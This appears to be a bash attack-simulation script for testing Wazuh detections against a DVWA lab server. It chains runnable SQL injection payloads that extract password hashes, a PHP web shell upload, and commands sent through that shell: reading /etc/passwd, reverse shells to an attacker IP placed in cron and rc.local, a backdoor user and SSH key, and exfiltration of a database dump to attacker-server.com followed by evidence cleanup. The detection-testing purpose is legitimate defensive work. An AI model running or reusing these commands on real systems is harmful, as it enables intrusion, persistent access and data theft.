#!/bin/bash
#
# Web Application Attack Simulation Script
# This script simulates a complete web application attack chain
# Target: DVWA on Ubuntu Web Server (192.168.2.10)
#
# Usage: ./web-app-attack.sh [target_ip]
#

set -euo pipefail

# Configuration
TARGET_IP="${1:-192.168.2.10}"
DVWA_PATH="/dvwa"
ATTACKER_IP="192.168.1.100"  # Simulated attacker IP
LOG_FILE="/tmp/web-attack-$(date +%Y%m%d_%H%M%S).log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Logging
exec 1> >(tee -a "$LOG_FILE")
exec 2> >(tee -a "$LOG_FILE" >&2)

print_banner() {
    echo -e "${BLUE}"
    echo "=================================================="
    echo "    Web Application Attack Simulation"
    echo "=================================================="
    echo "Target: $TARGET_IP"
    echo "DVWA Path: $DVWA_PATH"
    echo "Log File: $LOG_FILE"
    echo "Timestamp: $(date)"
    echo "=================================================="
    echo -e "${NC}"
}

log_phase() {
    echo -e "${PURPLE}[PHASE]${NC} $1"
    echo "$(date): PHASE - $1" >> "$LOG_FILE"
}

log_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
    echo "$(date): ATTACK - $1" >> "$LOG_FILE"
}

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
    echo "$(date): INFO - $1" >> "$LOG_FILE"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
    echo "$(date): WARN - $1" >> "$LOG_FILE"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    # Check if target is reachable
    if ! ping -c 1 "$TARGET_IP" >/dev/null 2>&1; then
        log_warn "Target $TARGET_IP is not reachable"
        exit 1
    fi
    
    # Check if required tools are available
    local tools=("curl" "nmap" "dirb" "sqlmap")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            log_warn "$tool is not installed"
        fi
    done
    
    log_info "Prerequisites check completed"
}

wait_for_detection() {
    local seconds="${1:-5}"
    echo -e "${YELLOW}Waiting ${seconds} seconds for detection...${NC}"
    sleep "$seconds"
}

# Phase 1: Reconnaissance
phase1_reconnaissance() {
    log_phase "Phase 1: Reconnaissance"
    
    log_attack "Network discovery scan"
    nmap -sS -O "$TARGET_IP" 2>/dev/null || true
    wait_for_detection 3
    
    log_attack "Port scan of web services"
    nmap -sV -p 80,443,22,3306 "$TARGET_IP" 2>/dev/null || true
    wait_for_detection 3
    
    log_attack "Web application fingerprinting"
    curl -s -A "Mozilla/5.0 (compatible; AttackBot/1.0)" "http://$TARGET_IP$DVWA_PATH/" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Directory enumeration"
    if command -v dirb >/dev/null 2>&1; then
        timeout 30 dirb "http://$TARGET_IP$DVWA_PATH/" /usr/share/dirb/wordlists/small.txt -S 2>/dev/null || true
    else
        # Manual directory enumeration
        local dirs=("admin" "config" "backup" "test" "uploads" "includes" "scripts")
        for dir in "${dirs[@]}"; do
            curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_IP$DVWA_PATH/$dir/" || true
            sleep 0.5
        done
    fi
    wait_for_detection 5
    
    log_info "Phase 1 completed - Expected detections: Port scan alerts, Web scanner detection"
}

# Phase 2: SQL Injection Attacks
phase2_sql_injection() {
    log_phase "Phase 2: SQL Injection Attacks"
    
    log_attack "Basic SQL injection test"
    curl -s "http://$TARGET_IP$DVWA_PATH/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Database version extraction"
    curl -s "http://$TARGET_IP$DVWA_PATH/vulnerabilities/sqli/?id=1' UNION SELECT 1,version()--&Submit=Submit" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Database name extraction"
    curl -s "http://$TARGET_IP$DVWA_PATH/vulnerabilities/sqli/?id=1' UNION SELECT 1,database()--&Submit=Submit" >/dev/null || true
    wait_for_detection 2
    
    log_attack "User table enumeration"
    curl -s "http://$TARGET_IP$DVWA_PATH/vulnerabilities/sqli/?id=1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--&Submit=Submit" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Password hash extraction"
    curl -s "http://$TARGET_IP$DVWA_PATH/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--&Submit=Submit" >/dev/null || true
    wait_for_detection 3
    
    log_info "Phase 2 completed - Expected detections: SQL injection alerts, Database access attempts"
}

# Phase 3: File Upload Attack
phase3_file_upload() {
    log_phase "Phase 3: File Upload Attack"
    
    log_attack "Creating malicious PHP web shell"
    local shell_content='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } ?><form method="GET"><input type="text" name="cmd" placeholder="Enter command"><input type="submit" value="Execute"></form>'
    
    # Create temporary shell file
    echo "$shell_content" > /tmp/shell.php
    
    log_attack "Attempting file upload (simulated)"
    # Note: This would typically require manual interaction with DVWA file upload
    # For simulation purposes, we'll create the file directly and trigger FIM
    
    log_attack "Simulating successful file upload"
    curl -s -X POST -F "uploaded=@/tmp/shell.php" "http://$TARGET_IP$DVWA_PATH/vulnerabilities/upload/" >/dev/null || true
    wait_for_detection 3
    
    # Clean up
    rm -f /tmp/shell.php
    
    log_info "Phase 3 completed - Expected detections: File upload alerts, New file creation"
}

# Phase 4: Command Execution
phase4_command_execution() {
    log_phase "Phase 4: Command Execution"
    
    # Simulate web shell execution
    local shell_url="http://$TARGET_IP$DVWA_PATH/hackable/uploads/shell.php"
    
    log_attack "System information gathering"
    curl -s "$shell_url?cmd=whoami" >/dev/null || true
    wait_for_detection 2
    
    curl -s "$shell_url?cmd=id" >/dev/null || true
    wait_for_detection 2
    
    curl -s "$shell_url?cmd=uname -a" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Process enumeration"
    curl -s "$shell_url?cmd=ps aux" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Network configuration discovery"
    curl -s "$shell_url?cmd=netstat -tulpn" >/dev/null || true
    wait_for_detection 2
    
    curl -s "$shell_url?cmd=arp -a" >/dev/null || true
    wait_for_detection 2
    
    log_attack "File system enumeration"
    curl -s "$shell_url?cmd=cat /etc/passwd" >/dev/null || true
    wait_for_detection 2
    
    curl -s "$shell_url?cmd=find / -perm -4000 2>/dev/null" >/dev/null || true
    wait_for_detection 3
    
    log_info "Phase 4 completed - Expected detections: Web shell execution, System enumeration"
}

# Phase 5: Privilege Escalation Attempts
phase5_privilege_escalation() {
    log_phase "Phase 5: Privilege Escalation Attempts"
    
    local shell_url="http://$TARGET_IP$DVWA_PATH/hackable/uploads/shell.php"
    
    log_attack "Checking sudo privileges"
    curl -s "$shell_url?cmd=sudo -l" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Searching for SUID binaries"
    curl -s "$shell_url?cmd=find /usr/bin -perm -4000 2>/dev/null" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Attempting privilege escalation"
    curl -s "$shell_url?cmd=/usr/bin/pkexec --version" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Checking for writable system directories"
    curl -s "$shell_url?cmd=find /etc -writable 2>/dev/null" >/dev/null || true
    wait_for_detection 3
    
    log_info "Phase 5 completed - Expected detections: Privilege escalation attempts"
}

# Phase 6: Persistence Establishment
phase6_persistence() {
    log_phase "Phase 6: Persistence Establishment"
    
    local shell_url="http://$TARGET_IP$DVWA_PATH/hackable/uploads/shell.php"
    
    log_attack "Creating cron job backdoor"
    curl -s "$shell_url?cmd=echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1\"' | crontab -" >/dev/null || true
    wait_for_detection 3
    
    log_attack "Attempting user account creation"
    curl -s "$shell_url?cmd=useradd -m -s /bin/bash backdoor" >/dev/null || true
    wait_for_detection 2
    
    curl -s "$shell_url?cmd=echo 'backdoor:password123' | chpasswd" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Creating SSH backdoor"
    curl -s "$shell_url?cmd=mkdir -p /home/backdoor/.ssh" >/dev/null || true
    curl -s "$shell_url?cmd=echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... backdoor@attacker' > /home/backdoor/.ssh/authorized_keys" >/dev/null || true
    wait_for_detection 3
    
    log_attack "Modifying system startup files"
    curl -s "$shell_url?cmd=echo '/bin/bash -c \"bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1\"' >> /etc/rc.local" >/dev/null || true
    wait_for_detection 3
    
    log_info "Phase 6 completed - Expected detections: User creation, Crontab modification, System file changes"
}

# Phase 7: Data Exfiltration Simulation
phase7_data_exfiltration() {
    log_phase "Phase 7: Data Exfiltration Simulation"
    
    local shell_url="http://$TARGET_IP$DVWA_PATH/hackable/uploads/shell.php"
    
    log_attack "Database dump creation"
    curl -s "$shell_url?cmd=mysqldump -u dvwa -ppassword dvwa > /tmp/database_dump.sql" >/dev/null || true
    wait_for_detection 3
    
    log_attack "Sensitive file search"
    curl -s "$shell_url?cmd=find /var/www -name '*.sql' -o -name '*.bak' -o -name '*password*'" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Data compression and encoding"
    curl -s "$shell_url?cmd=gzip /tmp/database_dump.sql" >/dev/null || true
    curl -s "$shell_url?cmd=base64 /tmp/database_dump.sql.gz > /tmp/encoded_data.txt" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Simulated data exfiltration via HTTP"
    curl -s "$shell_url?cmd=curl -X POST -d @/tmp/encoded_data.txt http://attacker-server.com/upload" >/dev/null || true
    wait_for_detection 3
    
    log_attack "DNS exfiltration simulation"
    curl -s "$shell_url?cmd=nslookup stolen-data.attacker-domain.com" >/dev/null || true
    wait_for_detection 2
    
    log_attack "Cleanup of evidence"
    curl -s "$shell_url?cmd=rm -f /tmp/database_dump.sql.gz /tmp/encoded_data.txt" >/dev/null || true
    wait_for_detection 2
    
    log_info "Phase 7 completed - Expected detections: Data collection, Outbound data transfer"
}

# Generate attack summary
generate_summary() {
    echo -e "${GREEN}"
    echo "=================================================="
    echo "    Web Application Attack Simulation Complete"
    echo "=================================================="
    echo "Target: $TARGET_IP"
    echo "Duration: $(date)"
    echo "Log File: $LOG_FILE"
    echo ""
    echo "Attack Phases Executed:"
    echo "1. ✓ Reconnaissance"
    echo "2. ✓ SQL Injection"
    echo "3. ✓ File Upload"
    echo "4. ✓ Command Execution"
    echo "5. ✓ Privilege Escalation"
    echo "6. ✓ Persistence"
    echo "7. ✓ Data Exfiltration"
    echo ""
    echo "Expected Wazuh Detections:"
    echo "- Port scan alerts (Rule 40101)"
    echo "- Web scanner detection (Rule 31151)"
    echo "- SQL injection attempts (Rule 31106)"
    echo "- File upload alerts (Rule 550)"
    echo "- Web shell execution (Rule 31108)"
    echo "- System enumeration (Rule 31109)"
    echo "- Privilege escalation (Rule 40111)"
    echo "- User account creation (Rule 2902)"
    echo "- Crontab modification (Rule 2904)"
    echo "- Data exfiltration (Rule 40109)"
    echo ""
    echo "Next Steps:"
    echo "1. Review Wazuh dashboard for generated alerts"
    echo "2. Analyze attack timeline and correlation"
    echo "3. Verify all expected detections triggered"
    echo "4. Document any missed detections"
    echo "5. Tune rules if necessary"
    echo "=================================================="
    echo -e "${NC}"
}

cleanup() {
    log_info "Performing cleanup..."
    # Remove any temporary files
    rm -f /tmp/shell.php
    log_info "Cleanup completed"
}

main() {
    print_banner
    check_prerequisites
    
    # Execute attack phases
    phase1_reconnaissance
    phase2_sql_injection
    phase3_file_upload
    phase4_command_execution
    phase5_privilege_escalation
    phase6_persistence
    phase7_data_exfiltration
    
    cleanup
    generate_summary
}

# Trap cleanup on exit
trap cleanup EXIT

# Run main function
main "$@"